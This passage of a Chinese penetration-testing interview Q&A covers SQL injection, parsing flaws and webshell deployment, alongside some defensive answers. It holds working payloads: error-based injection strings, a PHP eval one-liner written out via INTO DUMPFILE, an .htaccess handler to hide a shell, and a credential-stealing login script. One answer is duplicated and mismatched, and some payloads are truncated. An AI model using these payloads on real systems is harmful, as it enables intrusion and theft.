title="5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？"></a>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</h3><p>root权限以及网站的绝对路径。</p><h3 id="6-目前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#6-目前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="6.目前已知哪些版本的容器有解析漏洞，具体举例。"></a>6.目前已知哪些版本的容器有解析漏洞，具体举例。</h3><p>a、IIS 6.0<br>/xx.asp/xx.jpg “xx.asp”是文件夹名</p><p>b、IIS 7.0/7.5<br>默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p><p>c、Nginx<br>版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg.php</p><p>d、Apache 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p><p>e、lighttpd xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！</p><h3 id="7-如何手工快速判断目标站是windows还是linux服务器？"><a href="#7-如何手工快速判断目标站是windows还是linux服务器？" class="headerlink" title="7.如何手工快速判断目标站是windows还是linux服务器？"></a>7.如何手工快速判断目标站是windows还是linux服务器？</h3><p>linux大小写敏感,windows大小写不敏感。</p><h3 id="8-为何一个mysql数据库的站，只有一个80端口开放？"><a href="#8-为何一个mysql数据库的站，只有一个80端口开放？" class="headerlink" title="8.为何一个mysql数据库的站，只有一个80端口开放？"></a>8.为何一个mysql数据库的站，只有一个80端口开放？</h3><p>更改了端口，没有扫描出来。</p><p>站库分离。</p><p>3306端口不对外开放</p><h3 id="9、3389无法连接的几种情况"><a href="#9、3389无法连接的几种情况" class="headerlink" title="9、3389无法连接的几种情况"></a>9、3389无法连接的几种情况</h3><p>没开放3389 端口<br>端口被修改<br>防护拦截<br>处于内网(需进行端口转发)</p><h3 id="10-如何突破注入时字符被转义？"><a href="#10-如何突破注入时字符被转义？" class="headerlink" title="10.如何突破注入时字符被转义？"></a>10.如何突破注入时字符被转义？</h3><p>宽字符注入<br>hex编码绕过</p><h3 id="11-在某后台新闻编辑界面看到编辑器，应该先做什么？"><a href="#11-在某后台新闻编辑界面看到编辑器，应该先做什么？" class="headerlink" title="11.在某后台新闻编辑界面看到编辑器，应该先做什么？"></a>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</h3><p>查看编辑器的名称版本,然后搜索公开的漏洞。</p><h3 id="12-拿到一个webshell发现网站根目录下有-htaccess文件，我们能做什么？"><a href="#12-拿到一个webshell发现网站根目录下有-htaccess文件，我们能做什么？" class="headerlink" title="12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？"></a>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</h3><p>能做的事情很多，用隐藏网马来举例子：<br>插入</p><pre><code>&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code></pre><p>.jpg文件会被解析成.php文件。</p><p>具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p><h3 id="13-注入漏洞只能查账号密码？"><a href="#13-注入漏洞只能查账号密码？" class="headerlink" title="13.注入漏洞只能查账号密码？"></a>13.注入漏洞只能查账号密码？</h3><p>只要权限广，拖库脱到老。</p><h3 id="14-安全狗会追踪变量，从而发现出是一句话木马吗？"><a href="#14-安全狗会追踪变量，从而发现出是一句话木马吗？" class="headerlink" title="14.安全狗会追踪变量，从而发现出是一句话木马吗？"></a>14.安全狗会追踪变量，从而发现出是一句话木马吗？</h3><p>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p><h3 id="15-access-扫出后缀为asp的数据库文件，访问乱码，-如何实现到本地利用？"><a href="#15-access-扫出后缀为asp的数据库文件，访问乱码，-如何实现到本地利用？" class="headerlink" title="15.access 扫出后缀为asp的数据库文件，访问乱码，**如何实现到本地利用？"></a>15.access 扫出后缀为asp的数据库文件，访问乱码，**如何实现到本地利用？</h3><p>迅雷下载，直接改后缀为.mdb。</p><h3 id="16-提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#16-提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="16.提权时选择可读写目录，为何尽量不用带空格的目录？"></a>16.提权时选择可读写目录，为何尽量不用带空格的目录？</h3><p>因为exp执行多半需要空格界定参数</p><h3 id="17-某服务器有站点A-B-为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？"><a href="#17-某服务器有站点A-B-为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？" class="headerlink" title="17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？"></a>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</h3><p>同数据库。</p><h3 id="18-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？"><a href="#18-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？" class="headerlink" title="18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？"></a>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</h3><p>and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p><h3 id="19-某个防注入系统，在注入时会提示："><a href="#19-某个防注入系统，在注入时会提示：" class="headerlink" title="19:某个防注入系统，在注入时会提示："></a>19:某个防注入系统，在注入时会提示：</h3><p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p><h3 id="20、如何利用这个防注入系统拿shell？"><a href="#20、如何利用这个防注入系统拿shell？" class="headerlink" title="20、如何利用这个防注入系统拿shell？"></a>20、如何利用这个防注入系统拿shell？</h3><p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p><h3 id="21-上传大马后访问乱码时，有哪些解决办法？"><a href="#21-上传大马后访问乱码时，有哪些解决办法？" class="headerlink" title="21.上传大马后访问乱码时，有哪些解决办法？"></a>21.上传大马后访问乱码时，有哪些解决办法？</h3><p>浏览器中改编码。</p><h3 id="22-审查上传点的元素有什么意义？"><a href="#22-审查上传点的元素有什么意义？" class="headerlink" title="22.审查上传点的元素有什么意义？"></a>22.审查上传点的元素有什么意义？</h3><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p><h3 id="23-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#23-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h3><p>先爆破用户名，再利用被爆破出来的用户名爆破密码。<br>其实有些站点，在登陆处也会这样提示<br>所有和数据库有交互的地方都有可能有注入。</p><h3 id="24-目标站发现某txt的下载地址为"><a href="#24-目标站发现某txt的下载地址为" class="headerlink" title="24.目标站发现某txt的下载地址为"></a>24.目标站发现某txt的下载地址为</h3><p><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p><p>这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p><h3 id="25-甲给你一个目标站，并且告诉你根目录下存在-abc-目录，并且此目录下存在编辑器和admin目录。请问你的想法是？"><a href="#25-甲给你一个目标站，并且告诉你根目录下存在-abc-目录，并且此目录下存在编辑器和admin目录。请问你的想法是？" class="headerlink" title="25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？"></a>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</h3><p>直接在网站二级目录/abc/下扫描敏感文件及目录。</p><h3 id="26-在有shell的情况下，如何使用xss实现对目标站的长久控制？"><a href="#26-在有shell的情况下，如何使用xss实现对目标站的长久控制？" class="headerlink" title="26.在有shell的情况下，如何使用xss实现对目标站的长久控制？"></a>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</h3><p>后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p><p>在登录后才可以访问的文件中插入XSS脚本。</p><h3 id="27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？"><a href="#27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？" class="headerlink" title="27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？"></a>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</h3><p>审查元素 把密码处的password属性改成text就明文显示了</p><h3 id="28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则403-什么原因？"><a href="#28-目标站无防护，上传图片可以正常访问，上传脚本格式访问则403-什么原因？" class="headerlink" title="28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？"></a>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</h3><p>原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p><h3 id="29-审查元素得知网站所使用的防护软件，你觉得怎样做到的？"><a href="#29-审查元素得知网站所使用的防护软件，你觉得怎样做到的？" class="headerlink" title="29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？"></a>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</h3><p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。</p><h3 id="30-在win2003服务器中建立一个-zhongzi文件夹用意何为？"><a href="#30-在win2003服务器中建立一个-zhongzi文件夹用意何为？" class="headerlink" title="30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？"></a>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</h3><p>隐藏文件夹，为了不让管理员发现你传上去的工具。</p><h3 id="31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由："><a href="#31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：" class="headerlink" title="31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由："></a>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</h3><p>A. demo.jsp?id=2+1<br>B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p><h3 id="32、以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？"><a href="#32、以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？" class="headerlink" title="32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？"></a>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</h3><p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p><h3 id="33、发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选？"><a href="#33、发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选？" class="headerlink" title="33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？"></a>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</h3><p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p><h3 id="34、CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#34、CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p><h3 id="35、CSRF、SSRF和重放攻击有什么区别？"><a href="#35、CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="35、CSRF、SSRF和重放攻击有什么区别？"></a>35、CSRF、SSRF和重放攻击有什么区别？</h3><p>CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的</p><h3 id="36、说出至少三种业务逻辑漏洞，以及修复方式？"><a href="#36、说出至少三种业务逻辑漏洞，以及修复方式？" class="headerlink" title="36、说出至少三种业务逻辑漏洞，以及修复方式？"></a>36、说出至少三种业务逻辑漏洞，以及修复方式？</h3><p>密码找回漏洞中存在</p><p>1）密码允许暴力破解、</p><p>2）存在通用型找回凭证、</p><p>3）可以跳过验证步骤、</p><p>4）找回凭证可以拦包获取</p><p>等方式来通过厂商提供的密码找回功能来得到密码。身份认证漏洞中最常见的是</p><p>1）会话固定攻击</p><p>2） Cookie 仿冒</p><p>只要得到 Session 或 Cookie 即可伪造用户身份。验证码漏洞中存在</p><p>1）验证码允许暴力破解</p><p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p><h3 id="37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？"><a href="#37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？" class="headerlink" title="37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？"></a>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</h3><pre><code>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”HTTP/1.1Host:***.com:82User-Agent:Mozilla/5.0 Firefox/40Accept:text/css,/;q=0.1Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3Referer:http://*******.com/eciop/orderForCC/cgtListForCC.htm?zone=11370601&amp;v=145902Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;st_uid=N90PLYHLZGJXI-NX01VPUF46W;status=TrueConnection:keep-alive</code></pre><p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p><h3 id="38、给你一个网站你是如何来渗透测试的-在获取书面授权的前提下。"><a href="#38、给你一个网站你是如何来渗透测试的-在获取书面授权的前提下。" class="headerlink" title="38、给你一个网站你是如何来渗透测试的?在获取书面授权的前提下。"></a>38、给你一个网站你是如何来渗透测试的?在获取书面授权的前提下。</h3><h3 id="39、sqlmap，怎么对一个注入点注入？"><a href="#39、sqlmap，怎么对一个注入点注入？" class="headerlink" title="39、sqlmap，怎么对一个注入点注入？"></a>39、sqlmap，怎么对一个注入点注入？</h3><p>1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p><h3 id="40、nmap，扫描的几种方式"><a href="#40、nmap，扫描的几种方式" class="headerlink" title="40、nmap，扫描的几种方式"></a>40、nmap，扫描的几种方式</h3><h3 id="41、sql注入的几种类型？"><a href="#41、sql注入的几种类型？" class="headerlink" title="41、sql注入的几种类型？"></a>41、sql注入的几种类型？</h3><p>1）报错注入<br>2）bool型注入<br>3）延时注入<br>4）宽字节注入</p><h3 id="42、报错注入的函数有哪些？10个"><a href="#42、报错注入的函数有哪些？10个" class="headerlink" title="42、报错注入的函数有哪些？10个"></a>42、报错注入的函数有哪些？10个</h3><pre><code>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】2）通过floor报错 向下取整3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));10）.exp()select from test where id=1 and exp(~(select * from</code></pre><h3 id="43、延时注入如何来判断？"><a href="#43、延时注入如何来判断？" class="headerlink" title="43、延时注入如何来判断？"></a>43、延时注入如何来判断？</h3><pre><code>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</code></pre><h3 id="44、盲注和延时注入的共同点？"><a href="#44、盲注和延时注入的共同点？" class="headerlink" title="44、盲注和延时注入的共同点？"></a>44、盲注和延时注入的共同点？</h3><p>都是一个字符一个字符的判断</p><h3 id="45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行，-一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等"><a href="#45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行，-一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等" class="headerlink" title="45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等"></a>45、如何拿一个网站的webshell？上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</h3><h3 id="46、sql注入写文件都有哪些函数？"><a href="#46、sql注入写文件都有哪些函数？" class="headerlink" title="46、sql注入写文件都有哪些函数？"></a>46、sql注入写文件都有哪些函数？</h3><pre><code>select &#39;一句话&#39; into outfile &#39;路径&#39;select &#39;一句话&#39; into dumpfile &#39;路径&#39;select &#39;&lt;?php eval($_POST[1]) ?&gt;&#39; into dumpfile  &#39;d:\wwwroot\baidu.com\nvhack.php&#39;;</code></pre><h3 id="47、如何防止CSRF"><a href="#47、如何防止CSRF" class="headerlink" title="47、如何防止CSRF?"></a>47、如何防止CSRF?</h3><p>1）验证referer<br>2）验证token<br>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p><h3 id="48、owasp-漏洞都有哪些？"><a href="#48、owasp-漏洞都有哪些？" class="headerlink" title="48、owasp 漏洞都有哪些？"></a>48、owasp 漏洞都有哪些？</h3><p>1）SQL注入防护方法：<br>2）失效的身份认证和会话管理<br>3）跨站脚本攻击XSS<br>4）直接引用不安全的对象<br>5）安全配置错误<br>6）敏感信息泄露<br>7）缺少功能级的访问控制<br>8）跨站请求伪造CSRF<br>9）使用含有已知漏洞的组件<br>10）未验证的重定向和转发</p><h3 id="49、SQL注入防护方法？"><a href="#49、SQL注入防护方法？" class="headerlink" title="49、SQL注入防护方法？"></a>49、SQL注入防护方法？</h3><p>1）使用安全的API<br>2）对输入的特殊字符进行Escape转义处理<br>3）使用白名单来规范化输入验证方法<br>4）对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5）服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p><h3 id="50、代码执行，文件读取，命令执行的函数都有哪些？"><a href="#50、代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="50、代码执行，文件读取，命令执行的函数都有哪些？"></a>50、代码执行，文件读取，命令执行的函数都有哪些？</h3><p>1）代码执行：</p><pre><code>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</code></pre><p>2）文件读取：</p><pre><code>file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</code></pre><p>3)命令执行：</p><pre><code>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</code></pre><h3 id="51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"><a href="#51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"></a>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</h3><p>src指定一个远程的脚本文件，获取referer</p><h3 id="52、img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。"><a href="#52、img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。" class="headerlink" title="52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。"></a>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</h3><p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application/x-httpd-php .jpg </p><h3 id="53、为什么aspx木马权限比asp大？"><a href="#53、为什么aspx木马权限比asp大？" class="headerlink" title="53、为什么aspx木马权限比asp大？"></a>53、为什么aspx木马权限比asp大？</h3><p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p><h3 id="54、如何绕过waf？"><a href="#54、如何绕过waf？" class="headerlink" title="54、如何绕过waf？"></a>54、如何绕过waf？</h3><p>大小写转换法<br>干扰字符 /!/<br>编码 base64 unicode hex url ascll<br>复参数</p><h3 id="55、如何向服务器写入webshell？"><a href="#55、如何向服务器写入webshell？" class="headerlink" title="55、如何向服务器写入webshell？"></a>55、如何向服务器写入webshell？</h3><p>各种上传漏洞<br>mysql具有写入权限,用sql语句写入shell<br>http put方法</p><h3 id="56、渗透测试中常见的端口"><a href="#56、渗透测试中常见的端口" class="headerlink" title="56、渗透测试中常见的端口"></a>56、渗透测试中常见的端口</h3><p>a、web类(web漏洞/敏感目录) 第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p><blockquote><p>80 web<br>80-89 web<br>8000-9090 web</p></blockquote><p>b、数据库类(扫描弱口令)</p><blockquote><p>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL</p></blockquote><p>c、特殊服务类(未授权/命令执行类/漏洞)</p><blockquote><p>443 SSL心zang滴血<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p></blockquote><p>d、常用端口类(扫描弱口令/端口爆破)</p><blockquote><p>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面</p></blockquote><p>ALL、端口合计详情</p><blockquote><p>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心zang滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p></blockquote><h2 id="三、某安全厂商一面"><a href="#三、某安全厂商一面" class="headerlink" title="三、某安全厂商一面"></a>三、某安全厂商一面</h2><pre><code>了解哪些漏洞文件上传有哪些防护方式用什么扫描端口，目录如何判断注入注入有防护怎么办有没有写过tamper3306 1443 8080是什么端口计算机网络从物理层到应用层xxxx有没有web服务开发经验如何向服务器写入webshell有没有用过xss平台网站渗透的流程mysql两种提权方式（udf，？）常见加密方式xxxddos如何防护有没有抓过包，会不会写wireshark过滤规则清理日志要清理哪些</code></pre><h2 id="四、SQL注入防护"><a href="#四、SQL注入防护" class="headerlink" title="四、SQL注入防护"></a>四、SQL注入防护</h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>6、规范编码,字符集</p><h2 id="五、为什么参数化查询可以防止SQL注入"><a href="#五、为什么参数化查询可以防止SQL注入" class="headerlink" title="五、为什么参数化查询可以防止SQL注入"></a>五、为什么参数化查询可以防止SQL注入</h2><p>原理:</p><p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p><p>简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p><h2 id="六、SQL头注入点"><a href="#六、SQL头注入点" class="headerlink" title="六、SQL头注入点"></a>六、SQL头注入点</h2><p>UA<br>REFERER<br>COOKIE<br>IP</p><h2 id="七、盲注是什么？怎么盲注？"><a href="#七、盲注是什么？怎么盲注？" class="headerlink" title="七、盲注是什么？怎么盲注？"></a>七、盲注是什么？怎么盲注？</h2><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</p><h2 id="八、宽字节注入产生原理以及根本原因"><a href="#八、宽字节注入产生原理以及根本原因" class="headerlink" title="八、宽字节注入产生原理以及根本原因"></a>八、宽字节注入产生原理以及根本原因</h2><h3 id="1、产生原理"><a href="#1、产生原理" class="headerlink" title="1、产生原理"></a>1、产生原理</h3><p>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。</p><h3 id="2、在哪里编码"><a href="#2、在哪里编码" class="headerlink" title="2、在哪里编码"></a>2、在哪里编码</h3><h3 id="3、根本原因"><a href="#3、根本原因" class="headerlink" title="3、根本原因"></a>3、根本原因</h3><p>character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</p><h3 id="4、解决办法"><a href="#4、解决办法" class="headerlink" title="4、解决办法"></a>4、解决办法</h3><p>统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。</p><h3 id="5、SQL里面只有update怎么利用"><a href="#5、SQL里面只有update怎么利用" class="headerlink" title="5、SQL里面只有update怎么利用"></a>5、SQL里面只有update怎么利用</h3><p>先理解这句 SQL</p><pre><code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></pre><p>如果此 SQL 被修改成以下形式，就实现了注入</p><p>a、修改 homepage 值为<a href="http://xxx.net&/#39;">http://xxx.net&#39;</a>, userlevel=’3</p><p>之后 SQL 